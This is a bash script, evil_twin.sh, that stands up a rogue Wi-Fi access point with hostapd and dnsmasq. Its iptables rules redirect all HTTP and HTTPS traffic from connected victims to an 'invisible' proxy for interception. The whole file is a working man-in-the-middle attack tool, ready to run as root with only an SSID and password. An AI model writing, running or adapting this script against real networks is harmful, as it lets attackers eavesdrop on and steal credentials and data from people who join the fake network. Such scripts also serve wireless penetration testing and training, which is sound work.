#! /bin/bash

if [[ $EUID -ne 0 ]];
then
	echo "ERROR: insufficient privileges"
	exit 1
fi

if [ $# -ne 2 ]
then
	echo "ERROR: Incorrect syntax"
	echo -e "\n\tevil_twin.sh ssid password\n"
	exit 1
fi






# Defined the wifi name and password
ssid=$1
pwd=$2

# Define the config file path
netconfig_file="./netconfig.conf"

# Read the variables from the network configuration file
while read line; do
  if [[ $line == spoofed_device* ]]; then
    spoofed_device="${line#*=}"
  elif [[ $line == spoofed_wlan_gateway* ]]; then
    spoofed_wlan_gateway="${line#*=}"
  elif [[ $line == spoofed_wlan_network* ]]; then
    spoofed_wlan_network="${line#*=}"
  elif [[ $line == spoofed_wlan_netmask* ]]; then
    spoofed_wlan_netmask="${line#*=}"
  elif [[ $line == out_device* ]]; then
    out_device="${line#*=}"
  elif [[ $line == proxy_ip* ]]; then
    proxy_ip="${line#*=}"
  fi
done < "$netconfig_file"

echo "Configuring..."

# Set the network configuration for the wireless device
ifconfig $spoofed_device $spoofed_wlan_gateway netmask $spoofed_wlan_netmask

# Flush the current network address translation table
iptables -t nat -F

# Make outgoing traffic appear to originate from output device
iptables -t nat -A POSTROUTING -o $out_device -j MASQUERADE

# Proxy forwarding HTTP/S traffic
# Must use an invisible proxy
iptables -t nat -A PREROUTING -s $spoofed_wlan_network -p tcp --dport 80 -j DNAT --to $proxy_ip:80
iptables -t nat -A PREROUTING -s $spoofed_wlan_network -p tcp --dport 443 -j DNAT --to $proxy_ip:443

# Build the hostapd configuration file
echo "ssid=$ssid" > runtime_hostapd.conf
echo "wpa_passphrase=$pwd" >> runtime_hostapd.conf
cat ./hostapd.conf >> runtime_hostapd.conf

dnsmasq -C ./dnsmasq.conf -d & 1>&1 2>&2 
dnsmasq_pid=$!
echo -e "\nStarted dnsmasq($dnsmasq_pid)..."

hostapd ./runtime_hostapd.conf & 1>&1 2>&2
hostapd_pid=$!
echo -e "\nStarted hostapd($hostapd_pid)..."

echo -e "\nAccess Point:"
echo -e "ssid\t$ssid"
echo -e "pwd\t$pwd"
echo ""

# Remove the configuration file and flush the iptables rules
function cleanup() 
{
	rm ./runtime_hostapd.conf
	iptables -t nat -F
}

trap cleanup EXIT

wait
